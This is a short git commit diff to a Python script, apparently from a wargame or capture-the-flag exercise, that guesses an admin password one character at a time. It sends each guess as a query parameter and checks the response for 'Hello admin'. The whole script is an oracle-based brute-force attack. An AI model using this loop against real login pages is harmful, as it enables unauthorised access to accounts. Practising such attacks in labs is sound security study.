9cfaab4213bddae4fa12f7cd88791e31844a0450
minhee231 <goominhee123@gmail.com>
2024-05-22 09:07:51 +0900

    필터링 추가

--- app/test.py
+++ app/test.py
@@ -12,10 +12,10 @@ passwd = ''
 for i in range(8):  # 비밀번호 길이를 8로 가정
     for char in chars:
         test_password = passwd + char
-        print(test_password)
         response = requests.get(url, params={'pw': test_password})
 
-        if "부분적으로 일치합니다." in response.text or "correct1.html" in response.text:
+        # "Hello admin" 문구가 응답에 포함되면 비밀번호가 맞음
+        if 'Hello admin' in response.text:
             passwd += char
             print(f"현재 비밀번호: {passwd}")
             break
